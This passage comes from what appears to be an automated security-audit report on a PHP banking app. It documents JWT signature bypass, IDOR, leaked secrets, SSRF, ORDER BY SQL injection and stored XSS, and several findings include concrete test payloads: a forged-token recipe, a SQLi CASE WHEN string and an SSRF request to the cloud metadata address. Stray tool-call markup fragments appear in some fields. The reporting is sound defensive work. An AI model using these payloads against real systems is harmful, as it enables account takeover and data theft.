6. There is no other gate (e.g., middleware, secondary confirmation, step-up auth) anywhere in the route registration (Router.php only sets 'auth' => true for session authentication, unrelated to TOTP).

Therefore, both bypass paths are real and reachable from POST /api/transfers/external:
 a) A user who never enabled TOTP (totp_enabled=false) can transfer to a brand-new/manual payee with zero TOTP prompt/check — completely defeating the "first-transfer" 2FA control by design of the flawed fail-open branch.
 b) A user who has enabled TOTP can simply omit totp_code in the JSON body; the elseif is skipped, no forbidden response is triggered, and the transfer completes with totp_verified=0.

This is an authentic control-bypass logic bug (fail open) with a full source (HTTP request body avoiding totp_code, or acting as a totp_enabled=false account) to sink (funds transfer completion) path, and no effective compensating control anywhere in the call chain.</reasoning>
<parameter name="controls">["Validator::make() checks only structural/format fields (from_account_id, amount, bsb regex, account_number digits) — does not require totp_code presence or enforce TOTP state", "Route requires session auth ('auth' => true) but this is unrelated to TOTP/2FA and does not gate the fail-open logic"]

## 79. JWT signature never verified — auth tokens can be forged

- Lead reference: PWNJ-079
- Category: A07
- Severity: HIGH
- Confidence: 97%
- Validation: confirmed
- Reportable: Yes
- Location: BankOfEd-main/src/Services/AuthService.php:46-62
- Fingerprint: c19544d3f33de01cf277e6b02b5aa52a8d693342fa3b2411316ffb68a9e8b40a

### Evidence Chain

#### Source

```
BankOfEd-main/src/Services/AuthService.php:46-62
```

#### Controls encountered

```
[
  "None effective: decodeToken() only checks segment count (3) and unauthenticated 'exp' claim; it never invokes JWT::decode() or any HMAC/signature comparison against jwt_secret."
]
```

#### Sink

Not recorded

#### Counterevidence

```
[
  "No counterevidence found; createToken() does use JWT::encode() with a real secret, confirming the library and secret are available but simply not used on the decode/verify path."
]
```

#### Proof gaps

No unresolved static proof gaps

#### Attack path

```
{
  "nodes": [
    "External attacker",
    "Forge JWT: valid header+payload base64, arbitrary/garbage signature segment",
    "AuthMiddleware::handle() for every protected route",
    "AuthService::decodeToken() checks only segment count and exp claim, never verifies signature via JWT::decode()",
    "Full impersonation of arbitrary victim across profile, accounts, transfers, transactions"
  ],
  "impact": "Complete authentication bypass: any attacker can forge tokens for any user id since the signature (3rd JWT segment) is never validated against jwt_secret, defeating AuthMiddleware entirely.",
  "severity_reasoning": "High: duplicate of the core JWT-signature-bypass finding, root authentication control entirely broken.",
  "dynamic_test": "Craft a JWT with header.payload (arbitrary sub, future exp) and any/empty third segment; call any AuthMiddleware-protected route (e.g. GET /api/profile) and confirm access is granted despite no valid signature verification."
}
```

#### Validator reasoning

Code review confirms the claim exactly. AuthService::createToken() signs with Firebase\JWT\JWT::encode() using config['jwt_secret'], but AuthService::decodeToken() never calls JWT::decode() nor verifies the signature segment. It splits the token on '.', requires exactly 3 parts, base64-decodes only parts[1] (the payload), and validates only that 'exp' exists and is not in the past. The third segment (signature) is completely unchecked — it can be any string, including empty or garbage.

Call chain confirmed: Router.php dispatches routes with 'auth' => true (e.g., /api/profile, /api/accounts, /api/transactions, etc.) to AuthMiddleware::handle(), which extracts the Bearer token and calls AuthService::decodeToken($token) directly (Middleware/AuthMiddleware.php line 22). If decodeToken returns a non-null payload with exp in the future, the middleware proceeds to check isTokenRevoked($payload->jti) and User::findById($payload->sub) — both of which succeed for an attacker-controlled numeric 'sub' matching any existing/victim user ID, and jti is attacker controlled too (won't match any revoked-token row unless attacker reuses a specific revoked jti, which they wouldn't). The middleware then returns 'user' and 'payload' to the controller as an authenticated session for that user.

This is a complete authentication bypass: an attacker can craft base64url(json_header) + '.' + base64url(json.encode(['sub'=>victim_id,'jti'=>random,'exp'=>future])) + '.' + 'anything' and it will be treated as fully authenticated for the victim on every AuthMiddleware-protected endpoint. There is no other control (e.g., no additional HMAC check, no library call, no re-verification downstream) that mitigates this — grep confirms decodeToken is the sole verification path used by AuthMiddleware, and Router.php confirms many sensitive routes rely on this middleware with 'auth' => true.

## 80. Broken access control: any authenticated user can modify another user's profile via user_id parameter

- Lead reference: PWNJ-080
- Category: A01
- Severity: HIGH
- Confidence: 95%
- Validation: confirmed
- Reportable: Yes
- Location: BankOfEd-main/src/Controllers/ProfileController.php:49-58
- Fingerprint: 46950d336a00fcfb3162086c29c07adf435242a98e486c7adc6cb8d5f87af56b

### Evidence Chain

#### Source

```
BankOfEd-main/src/Controllers/ProfileController.php:49-58
```

#### Controls encountered

```
[
  "Route requires 'auth' => true (must be a valid authenticated session) but this only proves identity, not authorization over the target resource",
  "Input validation via Validator::make constrains field formats/lengths but does not constrain or validate targetUserId ownership",
  "array_intersect_key whitelist restricts which columns can be modified but not which row (user id) is modified",
  "Email uniqueness check exists but compares against the requester's own email, not an authorization boundary"
]
```

#### Sink

Not recorded

#### Counterevidence

No counterevidence recorded

#### Proof gaps

```
[
  "Did not execute a live request against a running instance to observe the HTTP response confirming exploitation end-to-end; relied on static code reading of the full call path (Router -> AuthMiddleware -> ProfileController::update -> User::update -> raw SQL)."
]
```

#### Attack path

```
{
  "nodes": [
    "Authenticated attacker user A",
    "PUT /api/profile {user_id:<victim B>, email:attacker@evil.com, ...}",
    "ProfileController::update() trusts data['user_id'] over $user['id']",
    "User::update($targetUserId, $updateData) executes UPDATE users SET ... WHERE id = ?",
    "Victim B's email/phone/address overwritten; attacker can hijack account recovery via the changed email"
  ],
  "impact": "Broken object-level authorization lets an attacker overwrite another customer's email/phone/address, enabling account-recovery hijacking and PII tampering.",
  "severity_reasoning": "High: BOLA/IDOR on a state-mutating endpoint with direct account-hijacking impact via email takeover.",
  "dynamic_test": "As authenticated user A, send PUT /api/profile with {\"user_id\": <victim B id>, \"email\": \"attacker@evil.com\"}; confirm the UPDATE users SET ... WHERE id=<B> executed by checking B's login/email afterwards."
}
```

#### Validator reasoning

ProfileController::update() is reachable via PUT /api/profile with only 'auth' => true (i.e. any valid authenticated session, no ownership or role check per Router.php). Inside the handler, $targetUserId is computed as (int)$data['user_id'] when the client-supplied JSON body includes a 'user_id' key, otherwise it falls back to the authenticated user's own id. This client-controlled value is passed directly to User::update($targetUserId, $updateData), which builds 'UPDATE users SET <fields> = ? ... WHERE id = ?' and executes it with $targetUserId bound as the WHERE clause parameter (User.php ~lines 42-66). There is no check anywhere in update() that $targetUserId === $user['id'] or that the caller has any admin/elevated privilege to modify other accounts. The $allowed field whitelist (first_name, last_name, email, phone, address fields) is honored for content but does not restrict the target row. Email uniqueness is checked against the requester's own current email ($user['email']), not the victim's, so an attacker can also usurp another account's email as long as it's not a duplicate elsewhere. This is a textbook IDOR / broken object-level authorization (CWE-639) allowing any authenticated user to overwrite another user's profile fields including email (used for login/recovery). The SQL itself is parameterized so this is not SQLi, but the authorization control is definitively missing, matching the candidate's claim precisely.

## 81. Health endpoint discloses JWT signing secret and DB credentials

- Lead reference: PWNJ-081
- Category: A05
- Severity: HIGH
- Confidence: 97%
- Validation: confirmed
- Reportable: Yes
- Location: BankOfEd-main/src/Router.php:23-34
- Fingerprint: ca3ec27164d93d8c32b62dfc42ac05bc0deb351850a9e4a4af5281b9729208fb

### Evidence Chain

#### Source

```
BankOfEd-main/src/Router.php:23-34
```

#### Controls encountered

```
[
  "Route auth flag inspected: 'auth' => false explicitly disables the auth middleware for this endpoint (no control present)",
  "No environment/debug gating found in health() or in config/app.php loading to restrict this to non-production",
  "No secret redaction/masking before output in Response::success()"
]
```

#### Sink

Not recorded

#### Counterevidence

```
[
  "decodeToken() in AuthService actually decodes JWT payload without verifying the signature at all ('without strict signature verification'), which is a separate, even more severe issue that arguably makes the jwt_secret leak redundant for basic token forgery via decodeToken's own bypass -- however AuthMiddleware may still call a signature-verifying path (e.g. AdminAuthMiddleware uses JWT::decode with Key verification), so the secret leak still independently enables forgery against any code path that does verify signatures (e.g., AdminAuthMiddleware uses config['jwt_secret'] from admin.php, a different secret, but AuthMiddleware likely relies on AuthService::decodeToken which doesn't verify signature, making the practical exploitation path even more direct via forged unsigned-looking tokens self-issued, but this doesn't diminish severity of the leak itself)"
]
```

#### Proof gaps

```
[
  "Did not fully trace AuthMiddleware::handle() to confirm whether it calls AuthService::decodeToken (no signature check) or a strict JWT::decode with signature verification using jwt_secret; either way the health endpoint leak is a valid, high-severity, unauthenticated secret disclosure regardless of which validation path is used downstream",
  "Did not verify whether this endpoint is reachable in the deployed/production build (e.g., via web server config or environment restrictions), but no such gating exists in the code reviewed"
]
```

#### Attack path

```
{
  "nodes": [
    "External unauthenticated client",
    "GET /api/health (auth=false)",
    "Router::health() response includes db_host, db_name, db_user, jwt_secret",
    "Attacker forges JWT for arbitrary user id using leaked secret",
    "AuthMiddleware/AuthService accept forged token -> account takeover"
  ],
  "impact": "Unauthenticated disclosure of the JWT secret and DB connection details, enabling forgery of valid session tokens for any user and DB reconnaissance.",
  "severity_reasoning": "High: duplicate critical unauthenticated secret-exposure with direct account-takeover impact.",
  "dynamic_test": "curl -s https://target/api/health with no auth; confirm jwt_secret/db_host/db_name/db_user returned; forge JWT with leaked secret and confirm AuthMiddleware acceptance."
}
```

#### Validator reasoning

Reviewed Router.php in full. The route table registers GET /api/health with 'auth' => false, and the dispatch() switch statement only invokes AuthMiddleware::handle() when $requiresAuth === true, or MachineAuthMiddleware::handle() when === 'machine'; for false it sets $auth = null and calls the handler directly with no authentication or authorization check whatsoever. The health() handler loads config/app.php and unconditionally places 'jwt_secret' => $config['jwt_secret'], plus db_host/db_name/db_user, into the JSON success response via Response::success(). Verified config/app.php is the exact same config file loaded by AuthService::getConfig() (identical path '__DIR__ . /../../config/app.php' vs '__DIR__ . /../config/app.php' from Router.php, both resolving to the same config/app.php), and AuthService::createToken() signs JWTs with JWT::encode($payload, $config['jwt_secret'], $config['jwt_algorithm']) using HS256 — a symmetric algorithm where knowledge of the secret allows full token forgery for any user id (the payload only contains iss/sub/jti/iat/exp, all attacker-controllable once the secret is known). There is no authentication requirement, no rate limiting, no environment gating (e.g. no check for APP_ENV=development), and no redaction of the secret before serialization. This is a complete, directly reachable source-to-sink path: unauthenticated HTTP GET -> Router::dispatch -> Router::health -> Response::success() echoing the live jwt_secret and DB credentials to any anonymous caller, which is then directly reusable to forge auth tokens against AuthService/AuthMiddleware.

## 82. SSRF in avatar proxy — server fetches arbitrary attacker-supplied URL

- Lead reference: PWNJ-082
- Category: A10
- Severity: MEDIUM
- Confidence: 90%
- Validation: confirmed
- Reportable: Yes
- Location: BankOfEd-main/src/Controllers/ProfileController.php:66-100
- Fingerprint: 3d1ffb9e591b9c617bdd5f47f84c53cf1ad841d651c096eb620440e3b7722e57

### Evidence Chain

#### Source

```
BankOfEd-main/src/Controllers/ProfileController.php:66-100
```

#### Controls encountered

```
[
  "None found: no scheme/host allow-list, no private/internal-IP block, no CSRF-token requirement noted for this state-changing endpoint (separate from SSRF itself), the only check present is emptiness of the 'url' field"
]
```

#### Sink

Not recorded

#### Counterevidence

```
[
  "No counterevidence found that blocks the SSRF path — route requires authentication only, which does not mitigate SSRF since ordinary registered users can reach it",
  "follow_location=true actually widens the attack surface (can pivot to arbitrary hosts via redirect) rather than narrowing it"
]
```

#### Proof gaps

```
[
  "Actual deployment network topology (which internal endpoints, metadata services, or additional egress-filtering proxies/firewalls exist in front of the app) is not verifiable from source alone, so real-world blast radius (e.g., successful cloud metadata credential theft) cannot be fully confirmed, though the code-level primitive itself is unambiguously present and exploitable for basic SSRF/data exfiltration and internal port/service enumeration."
]
```

#### Attack path

```
{
  "nodes": [
    "Authenticated user",
    "POST /api/profile/avatar {url:<internal/file target>}",
    "ProfileController::avatarProxy() file_get_contents() with follow_location, no allow-list",
    "Server fetches internal resource (metadata service, localhost service, or file://)",
    "Bytes returned base64-encoded to attacker; avatar_url persisted"
  ],
  "impact": "Authenticated user can force server-side requests to internal-only endpoints and exfiltrate the fetched content, enabling SSRF-based reconnaissance/data theft.",
  "severity_reasoning": "Medium: real SSRF impact, classified medium here reflecting overlap with higher-severity duplicate SSRF findings already scored high.",
  "dynamic_test": "POST /api/profile/avatar {\"url\":\"http://169.254.169.254/latest/meta-data/\"} or an internal-only host; inspect returned avatar_data (base64-decode) to confirm internal content was fetched and echoed back."
}
```

#### Validator reasoning

Reviewed ProfileController::avatarProxy() in full. The handler is registered at POST /api/profile/avatar with 'auth' => true in Router.php, so any authenticated user can reach it. The code takes $data['url'] straight from the JSON request body with only an empty-check (`empty($data['url'])`) — no scheme allow-list (e.g. blocking file://, gopher://, ftp://), no host allow-list, and no protection against private/link-local/metadata IP ranges (127.0.0.1, 169.254.169.254, internal Docker hostnames, etc.). This value is passed directly into `file_get_contents($data['url'], false, $context)` with `follow_location => true`, which will follow redirects too, further weakening any naive check even if one existed. The result: (1) fetched byte content is base64-encoded and returned directly to the caller in `avatar_data`, and the raw content-length is returned as well, giving a full read-oracle for arbitrary URLs/schemes reachable from the server — classic SSRF with response reflection/data exfiltration; (2) the raw URL is persisted via `User::update(...)`, so it will be reused on subsequent profile loads too (though the client-facing echo is the more direct impact here). No CSRF, WAF, network egress control, or input validation layer is visible in this codebase that would block this from source review. There is no dead code / unreachable path issue — the route is live and reachable by any authenticated user (not restricted to admins).

The only real gap is confirming actual production network topology (whether cloud metadata service or other sensitive internal endpoints are reachable from wherever this app is hosted), which cannot be established from source alone, but this does not change the fact that the code contains an unmitigated, exploitable SSRF primitive: attacker-controlled URL fetched server-side and echoed back with no allow-list/deny-list of schemes or hosts. This matches the description and evidence provided in the candidate exactly.

## 83. SQL injection via unsanitized ORDER BY column name in transaction history sort parameter

- Lead reference: PWNJ-083
- Category: A03
- Severity: HIGH
- Confidence: 95%
- Validation: confirmed
- Reportable: Yes
- Location: BankOfEd-main/src/Models/Transaction.php:38-56
- Fingerprint: 3886c203763c1c44ec5c5dceff6a5349fa13506a31a98486731aafa04719e5c4

### Evidence Chain

#### Source

```
BankOfEd-main/src/Models/Transaction.php:38-56
```

#### Controls encountered

```
[
  "Route requires authentication ('auth' => true) but this only gates access to logged-in users; it does not sanitize or validate the 'sort' parameter, so it does not mitigate the injection.",
  "page, perPage, and accountId are explicitly cast with (int) before use, showing developer awareness of type-based sanitization for other parameters, but this pattern was not applied to 'sort'."
]
```

#### Sink

Not recorded

#### Counterevidence

No counterevidence recorded

#### Proof gaps

```
[
  "Exploitability for boolean/error-based blind injection depends on underlying DB error verbosity settings and whether stacked queries or UNION-based extraction are possible for ORDER BY context specifically (typically limited to boolean-based blind techniques such as CASE WHEN in ORDER BY, or leveraging MySQL's ability to inject subqueries/functions in ORDER BY), but this does not change the fact that unsanitized SQL injection exists — it only affects which exploitation technique is used."
]
```

#### Attack path

```
{
  "nodes": [
    "Authenticated user",
    "GET /api/transactions?sort=<payload>",
    "TransactionController::index() reads $_GET['sort'] with no whitelist",
    "Transaction::findByUser() interpolates $sort into raw SQL text before prepare()",
    "PDO parameterization does not cover the ORDER BY text",
    "SQL injection executed"
  ],
  "impact": "Unvalidated sort parameter injected into the ORDER BY clause of the transaction listing query enables SQL injection, reachable by any authenticated user.",
  "severity_reasoning": "High: duplicate of the sort-parameter SQLi finding with confirmed exploitability.",
  "dynamic_test": "GET /api/transactions?sort=(SELECT CASE WHEN (1=1) THEN created_at ELSE id END) vs false-condition payload as authenticated user; compare responses to confirm SQL injection in the ORDER BY clause."
}
```

#### Validator reasoning

Verified the full source-to-sink path directly in the code:

1. Source: TransactionController::index() (src/Controllers/TransactionController.php line 20): `$sort = $_GET['sort'] ?? 'created_at';` — directly reads unsanitized user input from the query string with no validation, type coercion, or whitelist check (unlike `$page`, `$perPage`, `$accountId` which are all cast to int).
2. Propagation: `$sort` is passed unchanged into `Transaction::findByUser($userId, $page, $perPage, $accountId, $sort)`.
3. Sink: In Transaction::findByUser() (src/Models/Transaction.php lines 38-63), `$sort` is interpolated directly into a double-quoted SQL string literal: `"... ORDER BY t.{$sort} DESC ..."` for both the accountId-set and accountId-null branches, before the string is passed to `$db->prepare()`. PDO parameter binding (`?` placeholders) only covers the bound values (accountId, perPage, offset) — it does not sanitize or escape any part of the raw SQL text that was interpolated before prepare() is even called. There is no whitelist, `in_array()` check, `preg_match` filter, or column-name mapping applied to `$sort` anywhere in the call chain.
4. Route reachability confirmed: Router.php registers `GET /api/transactions` -> TransactionController::index with `auth => true`. This means the endpoint requires an authenticated session but performs no additional authorization or input-sanitization middleware that would block malicious `sort` values — any authenticated user (which in this app's threat model is not a trusted actor for this class of injection) can supply `?sort=<injection>`.
5. No competing mitigation was found elsewhere (e.g., a global input sanitizer, ORM abstraction, or WAF-equivalent) in the reviewed files.

This is a classic and unambiguous SQL injection via unsanitized ORDER BY clause built by string interpolation. The vulnerable code is real, reachable, and lacks any blocking control.

## 84. CORS misconfiguration: reflected Origin with credentials allowed; cors_origin config is dead code — Unused/dead cors_origin configuration gives false impression of origin restricti

- Lead reference: PWNJ-084
- Category: A05
- Severity: MEDIUM
- Confidence: 82%
- Validation: dismissed
- Reportable: No
- Location: BankOfEd-main/config/app.php:32 and BankOfEd-main/src/Middleware/CorsMiddleware.php:9-10
- Fingerprint: c89ede662d2fc03743f0a6b4ab2cda559fa245db4c02a21c0d4a7d7b1c4f9ac8

### Evidence Chain

#### Source

```
BankOfEd-main/config/app.php:32 and BankOfEd-main/src/Middleware/CorsMiddleware.php:9-10
```

#### Controls encountered

No controls recorded

#### Sink

Not recorded

#### Counterevidence

```
[
  "No session_start/setcookie/Set-Cookie usage found in the repository, meaning Access-Control-Allow-Credentials: true has no ambient browser-attached credential to leverage",
  "localStorage is same-origin isolated, so a malicious cross-origin page cannot read the victim's bankofed_token/bankofed_admin_token to forge an authenticated request without a separate XSS/primitive on the victim origin",
  "filter_reasoning already produced by the pipeline independently reaches the same conclusion and downgraded confidence below the actionable threshold"
]
```

#### Proof gaps

```
[
  "Not verified whether any other (e.g. mobile/legacy) client of this API relies on cookie-based auth that would reinstate exploitability",
  "Did not confirm there is no secondary cookie set by a reverse proxy/load balancer or by third-party session middleware outside the reviewed src/ and public/ folders",
  "Dead cors_origin config and permissive headers remain a real hardening/misconfiguration issue even though the specific credentialed-CSRF exploit chain described is not substantiated"
]
```

#### Attack path

Not available for this candidate

#### Validator reasoning

The CORS misconfiguration itself is real and confirmed in code: CorsMiddleware::handle() unconditionally reflects the request's Origin header into Access-Control-Allow-Origin and always sets Access-Control-Allow-Credentials: true, and the cors_origin config key in config/app.php is indeed dead code (grep shows it is defined once and never read anywhere in the codebase, and CorsMiddleware never references config at all). That much of the claim is accurate.

However, the claimed exploit impact — 'lets any malicious website make authenticated cross-origin XHR/fetch requests using the victim's cookies/Authorization header context' — does not hold for this application. A full-codebase search finds zero use of session_start(), setcookie(), or any Set-Cookie/PHPSESSID mechanism anywhere in the app; there is no cookie-based session at all. Authentication is via a Bearer token (JWT) that the frontend stores in localStorage (public/banking/js/api.js, public/admin/js/api.js) and attaches manually via an explicit `headers['Authorization'] = 'Bearer ' + token` line in first-party JS before each fetch call; server-side AuthMiddleware/AdminAuthMiddleware/MachineAuthMiddleware only accept it via the Authorization header (checked with a Bearer regex), never via a cookie.

Because there is no ambient credential (cookie, HTTP auth, TLS client cert) that browsers automatically attach to cross-origin requests, Access-Control-Allow-Credentials: true is functionally inert here — a malicious third-party origin's JavaScript has no way to read the victim's localStorage token (localStorage is same-origin isolated) and cannot cause the victim's browser to auto-attach the bearer token to a forged cross-origin request the way it would with a session cookie. Successful exploitation of the reflected-origin/credentials-true CORS header therefore requires an independent primitive (e.g., stored/reflected XSS on the victim's own origin) to first read the token out of localStorage — at which point the attacker already has means to exfiltrate/replay the token directly (e.g., via the XSS payload itself, or by simply using the token from a non-browser HTTP client, which is not CORS-restricted server-side at all), making the CORS misconfiguration not the operative vulnerability/primary attack path claimed in the description.

This matches and confirms the upstream filter_reasoning's downgrade rationale. The finding is best characterized as a hardening/defense-in-depth gap (permissive header hygiene, dead/misleading cors_origin config) rather than an independently exploitable vulnerability granting credentialed cross-origin access as described.</reasoning>
<parameter name="controls">["No cookie-based session or any Set-Cookie/session_start() usage anywhere in the codebase — grep across the tree returns zero matches", "Authentication is a Bearer JWT that must be explicitly read from localStorage and attached to the Authorization header by first-party JS (public/banking/js/api.js, public/admin/js/api.js) before every request", "Server-side AuthMiddleware/AdminAuthMiddleware/MachineAuthMiddleware only accept credentials via an explicit Authorization: Bearer header, never via cookie or other ambient credential"]

#### Code evidence

```
// config/app.php
'cors_origin' => getenv('CORS_ORIGIN') ?: '*',

// src/Middleware/CorsMiddleware.php (actual enforcement — ignores config)
$origin = $_SERVER['HTTP_ORIGIN'] ?? '*';
header("Access-Control-Allow-Origin: {$origin}");
header('Access-Control-Allow-Credentials: true');
```

## 85. Hardcoded default JWT secrets for admin and user auth enable token forgery — Hardcoded default user JWT secret

- Lead reference: PWNJ-085
- Category: A02
- Severity: HIGH
- Confidence: 78%
- Validation: confirmed
- Reportable: Yes
- Location: BankOfEd-main/config/admin.php:21, BankOfEd-main/config/app.php:23
- Fingerprint: 7dd267ad7d3e5922d9de66f926af7e79235068400e4aebf89ef59156984e0725

### Evidence Chain

#### Source

```
BankOfEd-main/config/admin.php:21, BankOfEd-main/config/app.php:23
```

#### Controls encountered

```
[
  "[\"deploy.sh generates a random secret via generate_secret() when writing a brand-new .env file, which mitigates risk for fresh installs performed through that exact script\", \"AdminAuthMiddleware additionally checks the 'iss' claim equals 'BankOfEdAdmin' and performs a DB lookup/revocation check, but these do not prevent forging the signature itself once the secret is known\"]\n<parameter name=\"counterevidence\">[\"deploy.sh's automated installer does generate cryptographically random JWT_SECRET/ADMIN_JWT_SECRET values and writes them to .env, reducing likelihood of hitting the fallback for deployments that use this exact script on a fresh install\"]\n<parameter name=\"proof_gaps\">[\"No confirmation of an actual production deployment where the env vars are unset — exploitability is contingent on operator/deployment misconfiguration rather than a code path that is reachable unconditionally\", \"Cannot verify from source alone whether the shipped/scanned instance's .env has these variables set or not\"]"
]
```

#### Sink

Not recorded

#### Counterevidence

No counterevidence recorded

#### Proof gaps

No unresolved static proof gaps

#### Attack path

```
{
  "nodes": [
    "Attacker with source/.env.example knowledge",
    "config/app.php jwt_secret fallback 'bankofed-dev-secret-change-in-production'",
    "Attacker signs JWT with default secret for arbitrary sub",
    "AuthMiddleware/AuthService accept token if this secret matches deployed config",
    "Full customer account takeover"
  ],
  "impact": "Hardcoded default user JWT secret enables forging customer session tokens if JWT_SECRET is never overridden in deployment, yielding full account takeover.",
  "severity_reasoning": "High: distinct root cause (user-side default secret) with critical account-takeover impact if unrotated.",
  "dynamic_test": "On unrotated deployment, sign a user JWT with 'bankofed-dev-secret-change-in-production' containing sub=<any user id>; call GET /api/profile with it and confirm acceptance."
}
```

#### Validator reasoning

config/app.php and config/admin.php both contain hardcoded fallback JWT HMAC secrets that are used verbatim whenever the JWT_SECRET / ADMIN_JWT_SECRET environment variables are not set (`getenv(...) ?: 'bankofed-...-secret-change-in-production'`). These config arrays are consumed directly by real signing/verification code paths: AdminAuthMiddleware::handle() decodes admin JWTs with `new Key($config['jwt_secret'], $config['jwt_algorithm'])`, AdminAuthController signs new admin tokens with the same secret, and AuthService/AuthMiddleware do the equivalent for regular user tokens via config/app.php. There is no additional secret-strength check, no runtime assertion that the env var was actually set, and no other authentication factor beyond a valid HS256 signature plus `iss` claim check (`BankOfEdAdmin` for admin) and a `sub` lookup. If an operator does not set the corresponding environment variable — which is exactly what the fallback exists to handle — anyone who has read the (public) source code knows the exact secret string and can forge a valid signed JWT with an arbitrary `sub` (any admin_users.id or users.id) and correct `iss`, achieving full authentication bypass against admin and/or customer endpoints in a financial application. The values themselves ('...-change-in-production') are a self-admitted insecure default. This is a source(hardcoded literal)-to-sink(JWT::decode/verify trust boundary) path with no code-level blocking control — the only mitigation is an operational one (setting env vars), and the shipped deploy.sh script only randomizes the secret when creating a brand-new .env, which is a deployment-time safeguard external to the application code, not a control that eliminates the hardcoded literal from the codebase or guarantees it's never reached (e.g., manual deploys, container images, dev/staging environments, or re-used installs that reuse an .env lacking these keys would still fall back to the hardcoded value). This matches the classic CWE-798 hardcoded credentials / insecure default pattern and is exploitable whenever the operational control is not followed, which the finding itself flags as a realistic and common misconfiguration.

#### Code evidence

```
// config/admin.php
'jwt_secret' => getenv('ADMIN_JWT_SECRET') ?: 'bankofed-admin-secret-change-in-production',
// config/app.php
'jwt_secret' => getenv('JWT_SECRET') ?: 'bankofed-dev-secret-change-in-production',

// AdminAuthMiddleware.php
$payload = JWT::decode($token, new Key($config['jwt_secret'], $config['jwt_algorithm']));
```

## 86. Unauthenticated /api/health leaks JWT secret and DB credentials — Endpoint is reachable without authentication

- Lead reference: PWNJ-086
- Category: A02
- Severity: HIGH
- Confidence: 97%
- Validation: confirmed
- Reportable: Yes
- Location: BankOfEd-main/src/Router.php:22-34
- Fingerprint: 36b97de4e0c8b6ff31b6e7a5f5e38950962b4bc7ebd15a0676b5ab0d24747040

### Evidence Chain

#### Source

```
BankOfEd-main/src/Router.php:22-34
```

#### Controls encountered

```
[
  "None: 'auth' => false explicitly disables AuthMiddleware for this route",
  "No environment/debug-mode gate restricting the extra fields to dev builds",
  "CorsMiddleware only sets CORS headers, does not authenticate"
]
```

#### Sink

Not recorded

#### Counterevidence

```
[
  "decodeToken() in AuthService.php does not actually verify JWT signatures on the read side (separate, arguably worse pre-existing weakness), which does not diminish this finding but shows secret leakage is not even strictly required to forge tokens for that specific decode path — however AdminAuthMiddleware and JWT::decode(...) elsewhere do rely on the secret, and createToken()/JWT::encode() unconditionally use it, so the leaked secret remains directly abusable for forging admin-verified tokens and any HS256-signed tokens checked via Firebase\\JWT\\JWT::decode."
]
```

#### Proof gaps

```
[
  "Did not confirm at runtime whether JWT_SECRET env var overrides the hardcoded default in a real deployment, but either way the same value returned by /api/health is the exact value used to sign/verify tokens, so this does not change exploitability.",
  "Did not trace whether a reverse proxy / web server config in front of PHP-FPM enforces any additional auth for /api/health, but no such control is present in the reviewed application code, and description scope is the application layer."
]
```

#### Attack path

```
{
  "nodes": [
    "External unauthenticated client",
    "Router.php registers GET /api/health with 'auth'=>false",
    "Request bypasses AuthMiddleware entirely",
    "Router::health() returns jwt_secret, db_host, db_name, db_user",
    "Attacker forges valid access tokens using leaked secret"
  ],
  "impact": "The health endpoint's lack of authentication gating is itself the root enabler for the jwt_secret/DB credential leak, permitting any network client to retrieve them.",
  "severity_reasoning": "High: root-cause missing authentication gate on a route that returns highly sensitive configuration.",
  "dynamic_test": "curl -s https://target/api/health confirming the endpoint requires no Authorization header at all and still returns jwt_secret/db_* fields."
}
```

#### Validator reasoning

The code exactly matches the cited evidence. Router::health() (Router.php:22-34) is registered at 'GET /api/health' with 'auth' => false (Router.php:96 in current file / line ~90s). public/index.php routes any /api/* request straight into Router::dispatch() with no global authentication gate — CorsMiddleware only sets headers, and the dispatch switch only invokes AuthMiddleware::handle() when the matched route's 'auth' flag is true (or MachineAuthMiddleware when 'machine'); for /api/health, requiresAuth is false, so $auth stays null and AuthController/AuthMiddleware are never invoked before call_user_func_array($handler, $args) executes Router::health(). health() loads config/app.php (which resolves jwt_secret from env JWT_SECRET or a hardcoded fallback 'bankofed-dev-secret-change-in-production') and returns db_host, db_name, db_user and jwt_secret directly in the JSON success response. This jwt_secret is exactly the key used by AuthService::createToken()/JWT::encode() and AdminAuthMiddleware/AdminAuthController to sign and (for the admin path) verify JWTs, so leaking it lets any unauthenticated caller mint their own valid tokens (auth bypass) in addition to exposing DB connection info. There is no authentication, rate limiting, IP allow-list, or environment gating (e.g., no check limiting the response to non-production) around this handler. The path from unauthenticated HTTP request to secret disclosure is direct and requires no additional preconditions.

#### Code evidence

```
public static function health(): void {
    $config = require __DIR__ . '/../config/app.php';
    Response::success([
        'status' => 'ok', 'php_version' => PHP_VERSION,
        'server' => $_SERVER['SERVER_SOFTWARE'] ?? 'unknown',
        'db_host' => $config['db_host'], 'db_name' => $config['db_name'],
        'db_user' => $config['db_user'], 'jwt_secret' => $config['jwt_secret'],
        'environment' => getenv('APP_ENV') ?: 'production',
    ]);
}
...
$r->addRoute('GET', '/api/health', ['handler' => [self::class, 'health'], 'auth' => false]);
```

## 87. Stored XSS in admin panel via customer name rendered inside inline event-handler attributes (HTML-entity encoding decoded before JS execution) — No server-side restriction / output-context-aware encoding of user-supplied firs

- Lead reference: PWNJ-087
- Category: A03
- Severity: HIGH
- Confidence: 90%
- Validation: confirmed
- Reportable: Yes
- Location: BankOfEd-main/public/admin/js/utils.js:20 (escapeHtml) used by BankOfEd-main/public/admin/js/pages/customers.js:~145 (renderDetail confirmDelete onclick), fx-rates.js:~88, accounts.js:~87
- Fingerprint: c5fb16623d92db7b22c476216d4dadba443ecbf68a8c7328ff4d6396af805ffd

### Evidence Chain

#### Source

```
BankOfEd-main/public/admin/js/utils.js:20 (escapeHtml) used by BankOfEd-main/public/admin/js/pages/customers.js:~145 (renderDetail confirmDelete onclick), fx-rates.js:~88, accounts.js:~87
```

#### Controls encountered

```
[
  "[\"escapeHtml() HTML-entity-encodes &, <, >, \\\", ' — but this control is insufficient for the inline-event-handler-attribute context because HTML entity decoding happens before the attribute value is JS-compiled, so it does not block JS context breakout in this specific sink\"]\n<parameter name=\"counterevidence\">[\"The .replace(/'/g, \\\"\\\\\\\\'\\\") call in the source is dead code as claimed (verified), showing awareness of the risk but implemented after escaping had already neutralized the character it targets — this doesn't defeat the finding, it explains the root cause\"]"
]
```

#### Sink

Not recorded

#### Counterevidence

No counterevidence recorded

#### Proof gaps

```
[
  "No live-browser/dynamic execution test was performed in this review; the entity-decoding-before-JS-compile behavior for onclick attributes is standard, well-documented HTML5 parsing behavior but was not empirically re-verified against a specific browser build in this session",
  "No CSP was found in the codebase, but this only confirms absence of one particular mitigation as observed in static source; runtime/production deployment configuration (e.g., reverse proxy headers, CDN-injected CSP) was not reviewed and is outside repo scope"
]
```

#### Attack path

```
{
  "nodes": [
